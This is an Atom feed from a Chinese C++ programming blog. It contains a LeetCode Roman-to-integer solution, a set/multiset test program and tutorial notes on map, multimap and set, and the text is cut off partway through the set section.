<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>--小 · 崧 · 子--</title>
  
  <subtitle>小崧子的最爱吃小松子</subtitle>
  <link href="https://lennon.work/atom.xml" rel="self"/>
  
  <link href="https://lennon.work/"/>
  <updated>2021-07-04T08:12:04.440Z</updated>
  <id>https://lennon.work/</id>
  
  <author>
    <name>Lennon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>13. 马数字转整数</title>
    <link href="https://lennon.work/2021/07/04/leetcode/leetcode13/"/>
    <id>https://lennon.work/2021/07/04/leetcode/leetcode13/</id>
    <published>2021-07-04T08:06:27.437Z</published>
    <updated>2021-07-04T08:12:04.440Z</updated>
    
    <content type="html"><![CDATA[<h3 id="leetcode题库-43-字符串相乘"><a href="#leetcode题库-43-字符串相乘" class="headerlink" title="leetcode题库 43. 字符串相乘"></a>leetcode题库 43. 字符串相乘</h3><hr><h4 id="原题信息"><a href="#原题信息" class="headerlink" title="原题信息"></a>原题信息</h4><hr><h5 id="原题链接"><a href="#原题链接" class="headerlink" title="原题链接:"></a>原题链接:</h5><blockquote><p><a href="https://leetcode-cn.com/problems/roman-to-integer/">https://leetcode-cn.com/problems/roman-to-integer/</a></p></blockquote><hr><h5 id="难度等级"><a href="#难度等级" class="headerlink" title="难度等级"></a>难度等级</h5><blockquote><p>中等</p></blockquote><hr><h5 id="原题描述"><a href="#原题描述" class="headerlink" title="原题描述"></a>原题描述</h5><blockquote><p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</p><p>字符          数值<br>I             1<br>V             5<br>X             10<br>L             50<br>C             100<br>D             500<br>M             1000<br>例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p><p>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。<br>X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。<br>C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。<br>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p></blockquote><p><img src="/img/lennon13/example.png" alt="example1"></p><hr><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><hr><h5 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h5><blockquote></blockquote><hr><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dojob</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> &amp;last, <span class="keyword">unsigned</span> <span class="keyword">int</span> &amp;sum, <span class="keyword">unsigned</span> <span class="keyword">int</span> tnew)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (tnew &gt; last) &#123;</span><br><span class="line">sum += (tnew - <span class="number">2</span> * last);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">sum += tnew;</span><br><span class="line">&#125;</span><br><span class="line">last = tnew;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> last = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">char</span> w : s) &#123;</span><br><span class="line"><span class="built_in"><span class="keyword">switch</span></span> (w) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="built_in">dojob</span>(last, sum,<span class="number">1000</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>: <span class="built_in">dojob</span>(last, sum, <span class="number">500</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="built_in">dojob</span>(last, sum, <span class="number">100</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>: <span class="built_in">dojob</span>(last, sum, <span class="number">50</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>: <span class="built_in">dojob</span>(last, sum, <span class="number">10</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="built_in">dojob</span>(last, sum, <span class="number">5</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>: <span class="built_in">dojob</span>(last, sum, <span class="number">1</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;what fuck!&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h5 id="代码链接"><a href="#代码链接" class="headerlink" title="代码链接"></a>代码链接</h5><p><a href="https://github.com/lennon-liu/leetcode/tree/main/lennon13">https://github.com/lennon-liu/leetcode/tree/main/lennon13</a></p><hr><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p><img src="/img/lennon13/lennon13_re.png" alt="lennon2"></p><hr><h4 id="优化与总结"><a href="#优化与总结" class="headerlink" title="优化与总结"></a>优化与总结</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><hr><blockquote><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;leetcode题库-43-字符串相乘&quot;&gt;&lt;a href=&quot;#leetcode题库-43-字符串相乘&quot; class=&quot;headerlink&quot; title=&quot;leetcode题库 43. 字符串相乘&quot;&gt;&lt;/a&gt;leetcode题库 43. 字符串相乘&lt;/h3&gt;&lt;hr</summary>
      
    
    
    
    <category term="leetcode" scheme="https://lennon.work/categories/leetcode/"/>
    
    
    <category term="简单难度" scheme="https://lennon.work/tags/%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6/"/>
    
    <category term="c++实现" scheme="https://lennon.work/tags/c-%E5%AE%9E%E7%8E%B0/"/>
    
    <category term="字符串" scheme="https://lennon.work/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>C++学习 关联容器测试代码</title>
    <link href="https://lennon.work/2021/06/15/cplusplus/%E4%B8%A5%E6%A0%BC%E5%BC%B1%E5%BA%8F%E4%B8%8Emultiset%E6%B5%8B%E8%AF%95/"/>
    <id>https://lennon.work/2021/06/15/cplusplus/%E4%B8%A5%E6%A0%BC%E5%BC%B1%E5%BA%8F%E4%B8%8Emultiset%E6%B5%8B%E8%AF%95/</id>
    <published>2021-06-15T07:57:52.216Z</published>
    <updated>2021-06-15T08:02:10.557Z</updated>
    
    <content type="html"><![CDATA[<p>customized_set ：自定义set内类型、erase、遍历、关系函数</p><p>customized_multiset ：自定义multiset内类型、erase、遍历、关系函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//============================================================================</span></span><br><span class="line"><span class="comment">// Name        : multi_set_te.cpp</span></span><br><span class="line"><span class="comment">// Author      : </span></span><br><span class="line"><span class="comment">// Version     :</span></span><br><span class="line"><span class="comment">// Copyright   : </span></span><br><span class="line"><span class="comment">// Description : </span></span><br><span class="line"><span class="comment">//============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Struct</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span><span class="params">(*s_compare_1)</span><span class="params">(<span class="keyword">const</span> Struct &amp;,<span class="keyword">const</span> Struct &amp;)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">s_compare</span><span class="params">(<span class="keyword">const</span> Struct &amp; s1,<span class="keyword">const</span> Struct &amp;s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> s1.a &lt; s2.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">s_compare_2</span><span class="params">(<span class="keyword">const</span> Struct &amp; s1,<span class="keyword">const</span> Struct &amp;s2)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> s1.a &lt;= s2.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span> &lt;&lt;(std::ostream&amp; os,<span class="keyword">const</span> Struct &amp; s1)&#123;</span><br><span class="line"><span class="keyword">return</span> os&lt;&lt;s1.a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">customized_multiset</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//multiset&lt;Struct,decltype(s_compare) *&gt; ms(s_compare);</span></span><br><span class="line">multiset&lt;Struct,s_compare_1&gt; ms(s_compare);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">5</span>&#125;);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">10</span>&#125;);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">20</span>&#125;);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">5</span>&#125;);</span><br><span class="line"><span class="comment">//multiset&lt;Struct,decltype(s_compare) *&gt;::const_iterator ms_cit = ms.begin();</span></span><br><span class="line">multiset&lt;Struct,s_compare_1&gt;::const_iterator ms_cit = ms.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(;ms_cit!=ms.<span class="built_in">end</span>();ms_cit++)&#123;</span><br><span class="line">cout&lt;&lt;*ms_cit&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;ms delete erase after&quot;</span>&lt;&lt;endl;</span><br><span class="line">ms.<span class="built_in">erase</span>(&#123;<span class="number">5</span>&#125;);</span><br><span class="line"><span class="comment">//multiset&lt;Struct,decltype(s_compare) *&gt;::const_iterator ms_cit = ms.begin();</span></span><br><span class="line">ms_cit = ms.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(;ms_cit!=ms.<span class="built_in">end</span>();ms_cit++)&#123;</span><br><span class="line">cout&lt;&lt;*ms_cit&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">customized_set</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//multiset&lt;Struct,decltype(s_compare) *&gt; ms(s_compare);</span></span><br><span class="line">set&lt;Struct,s_compare_1&gt; ms(s_compare);</span><br><span class="line"><span class="comment">//set&lt;Struct,s_compare_1&gt; ms(s_compare_2);</span></span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">5</span>&#125;);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">10</span>&#125;);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">20</span>&#125;);</span><br><span class="line">ms.<span class="built_in">insert</span>(&#123;<span class="number">5</span>&#125;);</span><br><span class="line"><span class="comment">//multiset&lt;Struct,decltype(s_compare) *&gt;::const_iterator ms_cit = ms.begin();</span></span><br><span class="line">multiset&lt;Struct,s_compare_1&gt;::const_iterator ms_cit = ms.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">for</span>(;ms_cit!=ms.<span class="built_in">end</span>();ms_cit++)&#123;</span><br><span class="line">cout&lt;&lt;*ms_cit&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vector2set2vector</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nums[] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span> &#125;;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">vec</span><span class="params">(nums,nums+<span class="number">12</span>)</span></span>;</span><br><span class="line"><span class="function">set&lt;<span class="keyword">int</span>&gt; <span class="title">st</span><span class="params">(vec.begin(), vec.end())</span></span>;</span><br><span class="line">vec.<span class="built_in">assign</span>(st.<span class="built_in">begin</span>(), st.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span> (it = vec.<span class="built_in">begin</span>(); it != vec.<span class="built_in">end</span>(); it++)</span><br><span class="line">cout &lt;&lt; *it&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//customized_set();</span></span><br><span class="line"><span class="comment">//customized_multiset();</span></span><br><span class="line"><span class="built_in">vector2set2vector</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;customized_set ：自定义set内类型、erase、遍历、关系函数&lt;/p&gt;
&lt;p&gt;customized_multiset ：自定义multiset内类型、erase、遍历、关系函数&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table</summary>
      
    
    
    
    <category term="C++" scheme="https://lennon.work/categories/C/"/>
    
    
    <category term="基础知识" scheme="https://lennon.work/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    <category term="概念必备" scheme="https://lennon.work/tags/%E6%A6%82%E5%BF%B5%E5%BF%85%E5%A4%87/"/>
    
    <category term="c++" scheme="https://lennon.work/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>C++学习 关联容器</title>
    <link href="https://lennon.work/2021/06/15/cplusplus/%E5%85%B3%E8%81%94%E5%AE%B9%E5%99%A8/"/>
    <id>https://lennon.work/2021/06/15/cplusplus/%E5%85%B3%E8%81%94%E5%AE%B9%E5%99%A8/</id>
    <published>2021-06-15T07:57:52.214Z</published>
    <updated>2021-06-23T08:19:32.321Z</updated>
    
    <content type="html"><![CDATA[<h3 id="关联容器"><a href="#关联容器" class="headerlink" title="关联容器"></a>关联容器</h3><p>容器分为顺序容器和关联容器，他们之间存在根本的区别，联容器中的元素是按关键字来保存和访问的。与之相对，顺序容器中的元素是按它们在容器中的位置来顺序保存和访问的。，主要顺序容器有vector、list、string、deque。主要的的关联容器有set、map。</p><p><img src="/img/cplusplus/stru.jpg" alt="img"></p><p><img src="/img/cplusplus/03.png" alt="微信截图_20210623133303"></p><hr><h4 id="关联容器之map"><a href="#关联容器之map" class="headerlink" title="关联容器之map"></a>关联容器之map</h4><p>map 由红黑树实现，其元素都是 “键值/实值” 所形成的一个对组（key/value pairs)， 插入和搜索的平均复杂度均为<code>O(log(size))</code>。每个元素有一个键，是排序准则的基础。每一个键只能出现一次，不允许重复。字典则是一个很好的使用map的例子：可以将单词作为关键字，将单词释义作为值。</p><p>map类型通常被称为关联数组。</p><p><strong>对于迭代器来说，可以修改实值，而不能修改 key。</strong></p><h5 id="map引申类型"><a href="#map引申类型" class="headerlink" title="map引申类型"></a>map引申类型</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map ：关联数组；保存关键字-值对；数据的存放是有序的</span><br><span class="line">multimap：关键字可以重复出现的map</span><br><span class="line">unordered_map：用哈希函数组织的map；容器中的数据存放是无序的</span><br><span class="line">unordered_multimap：哈希组织的map；关键字可以重复出现</span><br></pre></td></tr></table></figure><p><u>需要注意的是：类型map和multimap定义在头文件map中，unordered_map定义在头文件unordered_map中。</u></p><h5 id="map的相关定义"><a href="#map的相关定义" class="headerlink" title="map的相关定义"></a>map的相关定义</h5><p>类似顺序容器，关联容器也是模板。当定义一个map时，必须指明关键字类型又指明值类型。每个关联容器都定义了一个默认构造函数，它创建一个指定类型的空容器。我们也可以将关联容器初始化为另一个同类型容器的拷贝，或是从一个值范围来初始化关联容器，只要这些值可以转化为容器所需类型就可以。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map&lt;string,<span class="keyword">size_t</span>&gt; word_count;  <span class="comment">//string到size_t的空map</span></span><br><span class="line">map&lt;string,string&gt; authors1=&#123;&#123;<span class="string">&quot;Joyce&quot;</span>,<span class="string">&quot;James&quot;</span>&#125;,&#123;<span class="string">&quot;Austen&quot;</span>,<span class="string">&quot;Jane&quot;</span>&#125;&#125;;</span><br><span class="line">map&lt;string,string&gt;  authors2=authors1;</span><br></pre></td></tr></table></figure><h5 id="map容器定义了如下列出的类型，这些类型表示容器关键字和值的类型。"><a href="#map容器定义了如下列出的类型，这些类型表示容器关键字和值的类型。" class="headerlink" title="map容器定义了如下列出的类型，这些类型表示容器关键字和值的类型。"></a><strong>map容器定义了如下列出的类型，这些类型表示容器关键字和值的类型。</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key_type        map容器的关键字的类型 </span><br><span class="line">mapped_type     每个关键字对应的值的类型 </span><br><span class="line">value_type      为pair&lt;<span class="keyword">const</span> key_type,mapped_type&gt;</span><br></pre></td></tr></table></figure><h5 id="容器关键词的定义与使用"><a href="#容器关键词的定义与使用" class="headerlink" title="容器关键词的定义与使用"></a><strong>容器关键词的定义与使用</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map&lt;string,<span class="keyword">int</span>&gt;::value_type v1;   <span class="comment">//v1是一个pair&lt;const string,int&gt;</span></span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt;::key_type v2;     <span class="comment">//v2是一个string</span></span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt;::mapped_type v3;   <span class="comment">//v3是一个int</span></span><br></pre></td></tr></table></figure><h5 id="map的使用"><a href="#map的使用" class="headerlink" title="map的使用"></a>map的使用</h5><p> 当我们向顺序容器比如vector中插入元素时，我们可以使用push_back()函数将数据插入到容器尾部。但是关联容器不支持push_back()和push_front()的操作，所以我们想要往map中插入数据时，只能使用insert和emplace函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c.<span class="built_in">insert</span>(v)          v是value_type类型的对象</span><br><span class="line">c.<span class="built_in">emplace</span>(args)      args用来构造一个value_type类型的对象</span><br><span class="line">c.<span class="built_in">insert</span>(b,e)        b,e是迭代器，表示一个c::value_type类型值的范围</span><br><span class="line">c.<span class="built_in">insert</span>(il)         il代表花括号列表，花括号里是一个pair</span><br><span class="line">c.<span class="built_in">insert</span>(p,v)        类似<span class="built_in">insert</span>(v)，迭代器p指出从哪里开始搜索新元素应该存储的位置</span><br><span class="line">c.<span class="built_in">emplace</span>(p,args)    类似<span class="built_in">emplace</span>(args)，迭代器p指出从哪里开始搜索新元素应该存储的位置</span><br></pre></td></tr></table></figure><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a><strong>遍历</strong></h5><p>当解引用一个关联容器迭代器时，我们会得到一个类型为容器的value_type的值的引用。对map容器而言，它的迭代器其实指向的是一个pair类型的对象。我们可以使用迭代器遍历map容器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> map_it=word_count.<span class="built_in">cbegin</span>();</span><br><span class="line"><span class="keyword">for</span>(map_it;map_it!=word_count.<span class="built_in">cend</span>();map_it++)</span><br><span class="line">   cout&lt;&lt;map_it-&gt;first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;map_it-&gt;second&lt;&lt;endl;</span><br></pre></td></tr></table></figure><h5 id="访问元素"><a href="#访问元素" class="headerlink" title="访问元素"></a><strong>访问元素</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> it = word_count.<span class="built_in">find</span>(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(it==word_count.<span class="built_in">end</span>())</span><br><span class="line">   cout&lt;&lt;<span class="string">&quot;foobar is not in the map&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   cout&lt;&lt;it-&gt;first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;it-&gt;second&lt;&lt;endl;</span><br></pre></td></tr></table></figure><h5 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a><strong>删除元素</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c.erase(key)   &#x2F;&#x2F;从c中删除关键字为key的元素。返回一个size_type的值，指出删除元素数量</span><br><span class="line">c.erase(iterator_p)   &#x2F;&#x2F;从c中删除迭代器p指定的元素。</span><br><span class="line">c.erase(iterator_b,iterator_e) &#x2F;&#x2F;删除迭代器b和e表示的范围中的元素。返回e</span><br></pre></td></tr></table></figure><h5 id="优缺点和适用场景"><a href="#优缺点和适用场景" class="headerlink" title="优缺点和适用场景"></a><strong>优缺点和适用场景</strong></h5><p>优点：使用平衡二叉树实现，便于元素查找，且能把一个值映射成另一个值，可以创建字典。<br>缺点：每次插入值的时候，都需要调整红黑树，效率有一定影响。<br>适用场景：适用于需要存储一个数据字典，并要求方便地根据key找value的场景。</p><hr><h4 id="关联容器之multimap"><a href="#关联容器之multimap" class="headerlink" title="关联容器之multimap"></a><strong>关联容器之multimap</strong></h4><h5 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h5><h6 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a><strong>添加元素</strong></h6><p>由于multimap中容器的关键字不必唯一，所以我们可以向multimap中插入多个关键字相同的元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">multimap&lt;string,string&gt; authors;</span><br><span class="line">authors.<span class="built_in">insert</span>(&#123;<span class="string">&quot;ah&quot;</span>,<span class="string">&quot;my&quot;</span>&#125;);</span><br><span class="line">authors.<span class="built_in">insert</span>(&#123;<span class="string">&quot;ah&quot;</span>,<span class="string">&quot;mj&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><h6 id="下标访问"><a href="#下标访问" class="headerlink" title="下标访问"></a><strong>下标访问</strong></h6><p>map支持下标访问。multimap中的一个关键字可能对应多个值，所以multimap并不支持下标操作。</p><h6 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a><strong>查找元素</strong></h6><p>multimap一个关键字可能对应多个值，我们需要把这么对应的值都找出来。<br><strong>如果multimap中有多个元素具有相同的关键字，则这些关键字在容器中会相邻存储。</strong>我们可以通过这一特性，将一个关键字对应的多个值全部找出来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">search_item</span><span class="params">(<span class="string">&quot;Alain&quot;</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> numbers=authors.<span class="built_in">count</span>(search_item);</span><br><span class="line"><span class="keyword">auto</span> it=authors.<span class="built_in">find</span>(search_item);</span><br><span class="line"><span class="keyword">while</span>(numbers)</span><br><span class="line">&#123;</span><br><span class="line">   cout&lt;&lt;iter-&gt;second&lt;&lt;endl;</span><br><span class="line">   ++it;</span><br><span class="line">   numbers--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="关联容器之set"><a href="#关联容器之set" class="headerlink" title="关联容器之set"></a>关联容器之set</h4><p>set：由红黑树实现，其内部元素依据其值自动排序，每个元素值只能出现一次，不允许重复，插入和搜索的平均复杂度均为O(log(size))。set 中的元素都是排好序的，集合中没有重复的元素。</p><h5 id="定义与初始化"><a href="#定义与初始化" class="headerlink" title="定义与初始化"></a><strong>定义与初始化</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set&lt;string&gt; a1=&#123;<span class="string">&quot;fengxin&quot;</span>,<span class="string">&quot;666&quot;</span>&#125;;</span><br><span class="line">set&lt;string&gt; a2=a1;</span><br></pre></td></tr></table></figure><h5 id="添加与删除"><a href="#添加与删除" class="headerlink" title="添加与删除"></a><strong>添加与删除</strong></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 